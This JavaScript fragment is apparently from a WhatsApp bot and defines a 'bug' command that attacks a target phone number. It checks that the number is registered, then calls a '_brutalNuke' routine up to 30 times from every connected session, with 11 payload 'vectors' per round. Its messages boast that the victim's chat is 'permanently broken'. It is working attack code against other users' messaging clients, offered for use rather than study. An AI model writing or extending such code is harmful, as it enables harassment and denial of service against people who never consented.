const _makeBugCmd = (emoji, label, notice) => async ({ number, count, sock, replyJid, userId, name }) => {
  const clean = _bugValidateNum(number);
  if (!clean) return `❌ Usage: \`${label} <number> [times]\``;
  const times = Math.min(Math.max(1, parseInt(count) || 1), 30);
  const targetJid = `${clean}@s.whatsapp.net`;
  const { isOnWA } = await _bugCheckWA(sock, targetJid);
  if (!isOnWA) return `⚠️ +${clean} not on WhatsApp.`;

  const allSocks = _bugAllSocks(); const sessCount = allSocks.length || 1;
  try { await sock.sendMessage(replyJid, {
    text: `${emoji} *${notice} started*\n\n📱 *+${clean}*\n🔁 Rounds: *${times}*\n⚡ Sessions firing: *${sessCount}*\n🔥 Vectors per round: *11 simultaneously*\n\n_Nuking..._`,
  }); } catch (_) {}

  let sent = 0, failed = 0; const ticks = [];
  for (let i = 0; i < times; i++) {
    try { await _brutalNuke(targetJid, sock); sent++; ticks.push('✅'); }
    catch (e) { failed++; ticks.push('❌'); console.error(`[${label}]`, e.message); }
    // No delay — rapid back-to-back so WA can't recover between rounds
    if (i < times - 1) await sleep(400 + Math.random() * 200);
  }

  try {
    db.prepare(`INSERT INTO number_reports (reported_number, reported_by, reported_by_name, reason, group_id, reported_at) VALUES (?, ?, ?, ?, ?, ?)`)
      .run(clean, userId, name, `[${label} x${times}]`, '', Date.now());
  } catch (_) {}

  const rate = Math.round((sent / times) * 100);
  return (
    `${emoji} *${notice} Done!*\n\n${ticks.join('')}\n\n` +
    `📱 *+${clean}*\n🔁 Rounds: *${times}* (${rate}%)\n` +
    `⚡ ${sessCount} session${sessCount > 1 ? 's' : ''} × 11 vectors = *${sessCount * 11 * sent} total payloads*\n\n` +
    `💀 Chat is permanently broken until they clear it.\n✅ Done.`
  );
};

